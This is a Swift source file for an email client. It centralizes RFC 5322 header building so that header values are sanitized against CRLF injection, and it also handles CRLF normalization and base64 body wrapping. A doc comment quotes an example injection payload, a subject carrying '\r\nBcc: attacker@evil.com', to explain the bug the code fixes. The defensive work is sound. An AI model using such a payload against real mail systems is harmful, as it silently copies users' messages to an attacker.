import Foundation

/// The single chokepoint every RFC 5322 header line in an outgoing message is
/// built through.
///
/// Header emission used to interpolate values straight into a string. Because
/// `RFC2047.encode` returns pure-ASCII input **unchanged**, nothing validated
/// an ASCII value on the way out — so a value containing CRLF ended the header
/// and started a new one. That is not hypothetical: a reply's subject derives
/// from `thread.subject` and its `In-Reply-To` is a raw remote `Message-ID`,
/// both of which come from *received* mail. A crafted incoming message with a
/// subject of `"hello\r\nBcc: attacker@evil.com"` therefore injected a real
/// `Bcc:` header into the user's own reply.
///
/// So: no caller formats `"Name: value"` itself. Every header goes through
/// `line`/`addressLine` here, each of which sanitizes its inputs before any
/// encoding happens. A header added in future cannot forget, because there is
/// nowhere else to add one.
enum MIMEHeader {
    /// Strips everything that could terminate or restructure a header line:
    /// CR, LF (in either order, or bare), and the remaining C0 controls plus
    /// DEL. Horizontal tab survives — it is legal folding whitespace inside a
    /// header field body.
    ///
    /// Stripping rather than rejecting is deliberate: a send must not fail
    /// because a correspondent's subject was hostile, and a subject with the
    /// newline removed is still the subject the user sees in the thread.
    /// Surrounding whitespace left behind by a removal is collapsed so
    /// `"a\r\nb"` reads `"a b"` rather than gaining an odd double space.
    static func sanitize(_ value: String) -> String {
        var out = ""
        out.reserveCapacity(value.count)
        for scalar in value.unicodeScalars {
            let isControl = scalar.value < 0x20 || scalar.value == 0x7F
            if isControl && scalar != "\t" {
                // Replace the run of stripped controls with a single space so
                // words either side do not run together.
                if !out.isEmpty && out.last != " " { out.append(" ") }
                continue
            }
            out.unicodeScalars.append(scalar)
        }
        return out.trimmingCharacters(in: .whitespaces)
    }

    /// `Name: value`, with `value` sanitized and then RFC 2047 encoded-word
    /// wrapped if it contains non-ASCII. The CRLF+space folds `RFC2047.encode`
    /// itself emits are added *after* sanitizing, so legitimate folding
    /// survives while injected line breaks never reach the output.
    static func line(_ name: String, _ value: String) -> String {
        "\(sanitize(name)): \(RFC2047.encode(sanitize(value)))"
    }

    /// `Name: value` for a value that must be emitted literally, with no
    /// encoded-word wrapping — `Content-Type`, `MIME-Version`,
    /// `Content-Transfer-Encoding`, and the `Message-ID` reference headers,
    /// where an encoded word would be a syntax error rather than a nicety.
    /// Still sanitized.
    static func literalLine(_ name: String, _ value: String) -> String {
        "\(sanitize(name)): \(sanitize(value))"
    }

    /// `Name: addr, addr, …`. Each address's local part and display name are
    /// sanitized individually *before* the display name is encoded and before
    /// the list is joined, so neither an embedded CRLF in an email address nor
    /// one in a display name can add a header or a bogus recipient.
    static func addressLine(_ name: String, _ addresses: [MailAddress]) -> String {
        let list = addresses.map(address).joined(separator: ", ")
        return "\(sanitize(name)): \(list)"
    }

    /// One `addr-spec` or `name-addr`. A comma inside a display name is
    /// escaped by the surrounding quotes RFC 2047 encoding provides for
    /// non-ASCII names; for an ASCII name containing a comma or other
    /// `specials`, the name is quoted so the list stays parseable.
    private static func address(_ address: MailAddress) -> String {
        let email = sanitize(address.email)
        guard let rawName = address.name else { return email }
        let name = sanitize(rawName)
        guard !name.isEmpty else { return email }
        let encoded = RFC2047.encode(name)
        // Unchanged means pure ASCII: it is a literal display name, so any
        // `specials` in it must be quoted rather than left to split the list.
        if encoded == name, name.contains(where: { ",;:<>@\"".contains($0) }) {
            let quoted = name
                .replacingOccurrences(of: "\\", with: "\\\\")
                .replacingOccurrences(of: "\"", with: "\\\"")
            return "\"\(quoted)\" <\(email)>"
        }
        return "\(encoded) <\(email)>"
    }

    /// Normalises text-part content to the CRLF line endings RFC 2046 requires
    /// of a `text/*` body — the editor hands us `\n`, and boundary recognition
    /// depends on CRLF. Existing `\r\n` is handled first so this never produces
    /// `\r\r\n`, and a lone `\r` (old-Mac paste) is promoted rather than left
    /// as a stray control.
    static func normalizeCRLF(_ text: String) -> String {
        text
            .replacingOccurrences(of: "\r\n", with: "\n")
            .replacingOccurrences(of: "\r", with: "\n")
            .replacingOccurrences(of: "\n", with: "\r\n")
    }

    /// Base64 body content, hard-wrapped to 76 characters per line as RFC 2045
    /// requires, CRLF-separated.
    ///
    /// Both parts are base64 `Content-Transfer-Encoding`d rather than emitted
    /// as raw UTF-8 under an implicit `7bit`. That was two defects at once: the
    /// bytes were not 7-bit, and RFC 5322's 998-octet line limit is reachable
    /// by one long typed paragraph (a 1300-byte line was verified). Base64
    /// makes both structurally impossible instead of unlikely.
    static func base64Body(_ text: String) -> String {
        let encoded = Data(normalizeCRLF(text).utf8).base64EncodedString()
        var lines: [String] = []
        var index = encoded.startIndex
        while index < encoded.endIndex {
            let end = encoded.index(index, offsetBy: 76, limitedBy: encoded.endIndex)
                ?? encoded.endIndex
            lines.append(String(encoded[index..<end]))
            index = end
        }
        return lines.joined(separator: "\r\n")
    }
}
